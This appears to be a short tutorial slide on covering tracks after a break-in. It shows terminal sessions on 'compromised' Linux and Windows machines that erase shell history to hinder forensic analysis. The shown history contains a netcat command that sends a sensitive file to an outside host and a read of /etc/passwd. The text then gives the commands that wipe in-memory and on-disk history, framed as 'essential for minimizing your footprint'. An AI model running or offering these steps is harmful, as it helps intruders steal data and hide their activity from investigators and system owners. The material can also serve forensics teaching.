Linux TerminalTarget: 192.168.1.101
# On Compromised Linux System - Check current history
user@target:~$ history
    1  ls -la
    2  cat /etc/passwd
    3  nc 192.168.1.100 4444 < /tmp/sensitive_data.txt
    4  history

# Clear current session's history (in-memory)
user@target:~$ history -c

# Remove the persistent history file from disk
user@target:~$ rm ~/.bash_history

# Verify history is gone (should be empty or only show 'history' command)
user@target:~$ history
    1  history

# On Compromised Windows System (PowerShell) - Clear PowerShell history
PS C:\> Clear-History
PS C:\> Get-Content (Get-PSReadLineOption).HistorySavePath
# Output should be empty or show only the Clear-History command

Why Clear History?

  • Forensic Goldmine: History files reveal every command executed.
  • Attribution: Links specific actions to a user or attacker.
  • Reconnaissance: Shows what an attacker was looking for.
  • Stealth: Essential for minimizing your footprint.

Linux vs. Windows

  • Linux: ~/.bash_history, ~/.zsh_history. Clear with history -c and rm.
  • Windows: PowerShell history (Clear-History). CMD history is less persistent.
Key Takeaway

Clearing command history is a fundamental step in covering tracks, removing a direct record of your actions and significantly hindering forensic analysis.
